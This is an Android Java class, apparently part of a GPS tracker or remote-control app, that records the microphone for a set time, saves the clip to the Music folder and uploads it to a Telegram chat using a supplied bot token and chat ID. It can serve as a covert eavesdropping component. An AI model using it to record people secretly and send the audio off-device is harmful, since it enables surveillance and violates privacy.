package com.example.gpsstandalone;

import android.Manifest;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.provider.MediaStore;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;




public class VoiceRecorder {
    private static final String TAG = "VoiceRecorder";
    private static VoiceRecorder instance;

    private MediaRecorder recorder;
    private File outputFile;

    public static VoiceRecorder getInstance() {
        if (instance == null) instance = new VoiceRecorder();
        return instance;
    }

    public void startRecording(Context context, int seconds, String token, String chatId) {
        Log.d(TAG, "Mulai persiapan merekam suara selama " + seconds + " detik");

        // NOTE: Pastikan RECORD_AUDIO & WRITE_EXTERNAL_STORAGE telah diminta secara runtime!

        try {
            // Gunakan getCacheDir atau fallback ke external storage jika perlu
            outputFile = new File(context.getCacheDir(), "audio.3gp");
            if (!outputFile.getParentFile().exists()) {
                outputFile.getParentFile().mkdirs();
            }
            if (outputFile.exists()) {
                boolean deleted = outputFile.delete();
                Log.d(TAG, "File sebelumnya dihapus: " + deleted);
            }

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(outputFile.getAbsolutePath());

            recorder.prepare();
            recorder.start();
            Log.d(TAG, "Recorder berhasil start. Merekam ke: " + outputFile.getAbsolutePath());

            // Stop setelah X detik + delay 500ms untuk jaga-jaga
            new Handler().postDelayed(() -> stopRecording(context, token, chatId),
                    seconds * 1000L + 500);

        } catch (IOException e) {
            Log.e(TAG, "IOException saat merekam: " + e.getMessage(), e);
        } catch (IllegalStateException e) {
            Log.e(TAG, "IllegalStateException saat merekam: " + e.getMessage(), e);
        } catch (Exception e) {
            Log.e(TAG, "Exception umum saat mulai rekam: " + e.getMessage(), e);
        }
    }
    public void saveToGallery(Context context) {
        try {
            ContentValues values = new ContentValues();
            values.put(MediaStore.Audio.Media.DISPLAY_NAME, "rekaman_" + System.currentTimeMillis() + ".3gp");
            values.put(MediaStore.Audio.Media.MIME_TYPE, "audio/3gpp");
            values.put(MediaStore.Audio.Media.RELATIVE_PATH, Environment.DIRECTORY_MUSIC + "/MyRecordings");

            ContentResolver resolver = context.getContentResolver();
            Uri audioUri = resolver.insert(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, values);

            if (audioUri == null) {
                Log.e(TAG, "Gagal membuat URI untuk MediaStore");
                return;
            }

            OutputStream outStream = resolver.openOutputStream(audioUri);
            FileInputStream inStream = new FileInputStream(outputFile);

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = inStream.read(buffer)) != -1) {
                outStream.write(buffer, 0, bytesRead);
            }

            inStream.close();
            outStream.close();

            Log.d(TAG, "Berhasil disimpan ke galeri (MediaStore)");

        } catch (Exception e) {
            Log.e(TAG, "Gagal menyimpan ke galeri: " + e.getMessage(), e);
        }
    }





    private void stopRecording(Context context, String token, String chatId) {
        Log.d(TAG, "Memproses stopRecording...");

        try {
            if (recorder != null) {
                recorder.stop();
                recorder.reset();
                recorder.release();
                recorder = null;
                Log.d(TAG, "Rekaman dihentikan dan MediaRecorder dilepas");
            }

            if (outputFile == null || !outputFile.exists()) {
                Log.e(TAG, "File rekaman tidak ditemukan");
                return;
            }

            long fileSize = outputFile.length();
            Log.d(TAG, "Ukuran file rekaman: " + fileSize + " bytes");

            if (fileSize < 1000) {
                Log.e(TAG, "File terlalu kecil, kemungkinan kosong atau gagal rekam");
                return;
            }

            saveToGallery(context);

            // ⛔ JANGAN LANGSUNG KIRIM DARI MAIN THREAD
            new Thread(() -> {
                try {
                    Log.d(TAG, "Mengirim ke Telegram (dari thread terpisah)...");
                    TelegramHelper telegramHelper = new TelegramHelper(context);
                    telegramHelper.sendAudio(token, chatId, outputFile);
                    // telegramHelper.sendVoice(token, chatId, outputFile); // opsional
                } catch (Exception e) {
                    Log.e(TAG, "Gagal kirim ke Telegram: " + e.getMessage(), e);
                }
            }).start();

        } catch (IllegalStateException e) {
            Log.e(TAG, "IllegalStateException saat stop: " + e.getMessage(), e);
        } catch (RuntimeException e) {
            Log.e(TAG, "RuntimeException saat stop: " + e.getMessage(), e);
        } catch (Exception e) {
            Log.e(TAG, "Exception saat stopRecording: " + e.getMessage(), e);
        }
    }

    /*
    private void stopRecording(Context context, String token, String chatId) {
        Log.d(TAG, "Memproses stopRecording...");

        try {
            if (recorder != null) {
                recorder.stop();
                recorder.reset();
                recorder.release();
                recorder = null;
                Log.d(TAG, "Rekaman dihentikan dan MediaRecorder dilepas");
            }

            if (outputFile == null || !outputFile.exists()) {
                Log.e(TAG, "File rekaman tidak ditemukan");
                return;
            }

            long fileSize = outputFile.length();
            Log.d(TAG, "Ukuran file rekaman: " + fileSize + " bytes");

            if (fileSize < 1000) {
                Log.e(TAG, "File terlalu kecil, kemungkinan kosong atau gagal rekam");
                return;
            }



            saveToGallery(context);

            // Kirim voice ke Telegram
            Log.d(TAG, "Mengirim ke Telegram...");
            TelegramHelper telegramHelper = new TelegramHelper(context);

            telegramHelper.sendVoice(token, chatId, outputFile);



        } catch (IllegalStateException e) {
            Log.e(TAG, "IllegalStateException saat stop: " + e.getMessage(), e);
        } catch (RuntimeException e) {
            Log.e(TAG, "RuntimeException saat stop: " + e.getMessage(), e);
        } catch (Exception e) {
            Log.e(TAG, "Exception saat stopRecording: " + e.getMessage(), e);
        }
    }

     */
}
